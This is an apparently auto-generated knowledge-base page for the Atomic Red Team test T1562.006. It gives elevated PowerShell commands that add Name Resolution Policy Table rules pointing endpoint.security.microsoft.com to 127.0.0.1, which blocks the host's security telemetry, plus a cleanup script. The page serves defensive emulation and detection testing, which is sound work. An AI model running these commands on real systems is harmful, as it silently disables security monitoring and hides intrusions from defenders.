---
atomic_guid: "1174b5df-2c33-490f-8854-f5eb80c907ca"
title: "Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.006"
attack_technique_name: "Impair Defenses: Indicator Blocking"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.006/T1562.006.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "1174b5df-2c33-490f-8854-f5eb80c907ca"
  - "Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table

Adversaries are redirecting DNS queries to an incorrect or malicious DNS server IP, thereby blocking legitimate communications and potentially compromising the security infrastructure. This atomic test aims to respond with 127.0.0.1 when a DNS query is made for endpoint.security.microsoft.com.

## Metadata

- Atomic GUID: 1174b5df-2c33-490f-8854-f5eb80c907ca
- Technique: T1562.006: Impair Defenses: Indicator Blocking
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1562.006/T1562.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.006]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Add-DnsClientNrptRule -Namespace ".endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"
Add-DnsClientNrptRule -Namespace "endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"
Clear-DnsClientCache
```

### Cleanup

```powershell
try {
    # Get all current NRPT rules
        $DnsClientNrptRules = Get-DnsClientNrptRule | Where-Object { $_.Comment -eq 'Silenced by Name Resolution Policy Table' }
    
    # Remove each NRPT rule
        foreach ($rule in $DnsClientNrptRules) {
            Remove-DnsClientNrptRule -Name $rule.Name -Force
        }
    
    # Clear DNS client cache
    Clear-DnsClientCache
    Write-Host "All NRPT rules have been removed and the DNS cache has been cleared."
}

catch {
    Write-Host "An error occurred: $_"
}
Clear-DnsClientCache
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.006/T1562.006.yaml)
